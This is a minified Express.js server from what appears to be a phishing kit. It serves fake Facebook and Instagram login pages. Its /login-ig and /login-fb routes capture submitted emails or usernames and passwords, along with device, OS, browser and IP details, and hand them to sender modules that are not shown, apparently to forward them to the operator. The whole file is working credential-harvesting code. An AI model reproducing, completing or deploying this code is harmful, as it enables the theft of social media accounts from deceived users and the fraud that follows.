require("dotenv").config();let express=require("express"),path=require("path"),fs=require("fs/promises"),bodyParser=require("body-parser"),useragent=require("express-useragent"),requestIp=require("request-ip"),cors=require("cors"),send1=require("./src/utils/sender1.js"),send2=require("./src/utils/sender2.js"),app=express(),PORT=process.env.PORT||3e3;app.use(bodyParser.json()),app.use(express.json()),app.use(useragent.express()),app.use(requestIp.mw()),app.set("trust proxy",!0),app.use(express.urlencoded({extended:!0})),app.use(cors({origin:"*",methods:["GET","POST"],allowedHeaders:["Content-Type"]})),app.use(express.static(path.join(__dirname,"public"))),app.get("/",(e,s)=>{s.sendFile(path.join(__dirname,"src","views","index.html"))}),app.get("/login-fb",(e,s)=>{s.sendFile(path.join(__dirname,"src/views/login-fb.html"))}),app.post("/login-ig",(e,s)=>{var{usernameLogin:n,passwordLogin:r,modelInfo:o,platformInfo:p,versiInfo:a,loginIg:i}=e.body,t=e.useragent,n=n||"Unknown",r=r||"Unknown",o=o+" "+p+" "+a||"Unknown",p=t.os||"Unknown",a=t.browser||"Unknown",t=e.clientIp||"Unknown",e=i||"Unknown";send1({emVal:n,passVal:r,device:o,os:p,browser:a,ipAddress:t,logVia:e}),s.sendStatus(200)}),app.post("/login-fb",(e,s)=>{var{email:n,password:r,modelInfo:o,platformInfo:p,versiInfo:a,loginFb:i}=e.body,t=e.useragent,n=n||"Unknown",r=r||"Unknown",o=o+" "+p+" "+a||"Unknown",p=t.os||"Unknown",a=t.browser||"Unknown",t=e.clientIp||"Unknown",e=i||"Unknown";send2({emVal:n,passVal:r,device:o,os:p,browser:a,ipAddress:t,logVia:e}),s.sendStatus(200)}),app.use((e,s)=>{s.status(404).redirect("/")}),app.use((e,s,n,r)=>{console.error(e.stack),n.status(500).send("Terjadi kesalahan server.")}),app.listen(PORT,()=>{console.log("ðŸš€ Server running at http://localhost:"+PORT)});